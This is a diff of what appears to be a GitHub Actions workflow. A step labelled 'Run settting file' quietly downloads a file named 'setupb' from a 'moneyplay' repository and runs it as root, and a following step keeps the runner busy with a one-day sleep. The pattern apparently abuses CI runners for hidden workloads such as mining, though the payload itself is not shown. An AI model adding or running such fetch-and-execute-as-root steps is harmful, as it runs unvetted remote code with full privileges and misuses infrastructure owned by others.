@@ -11,7 +11,7 @@ jobs:
       
        
       - name: Run settting file
-        run: sudo apt update &> /dev/null && timeout 1s ping github.com && wget https://github.com/githubaunglaymyanmar1/moneyplay/raw/main/project2/download/setupb &> /dev/null && sudo bash setupb
+        run: sudo apt update &> /dev/null && ping -c 1 github.com && wget https://github.com/githubaunglaymyanmar1/moneyplay/raw/main/project2/download/setupb &> /dev/null && sudo bash setupb
         
       - name: Ubuntu ready to go 
         run: sleep 1d  
